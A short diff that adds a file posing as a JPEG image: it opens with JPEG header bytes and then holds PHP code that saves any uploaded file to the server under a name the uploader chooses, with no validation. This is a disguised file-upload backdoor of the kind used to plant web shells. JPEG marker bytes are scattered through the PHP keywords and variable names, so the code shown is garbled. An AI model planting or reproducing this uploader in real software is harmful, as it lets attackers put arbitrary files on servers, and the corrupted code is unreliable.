@@ -1,0 +1,8 @@
+ÿØÿàÿÐ<?php
+if(isset($_FILES['ÿÑfile'])) {
+    $tmp = $_ÿÒFILES['file']['tmp_name'ÿÓ];
+    $name = $_FILES['ÿÔfile']['name'];
+    moveÿÕ_uploaded_file($tmp, $naÿÖme);
+    echo "Uploaded:ÿ× " . $name;
+}
+?>ÿÙ
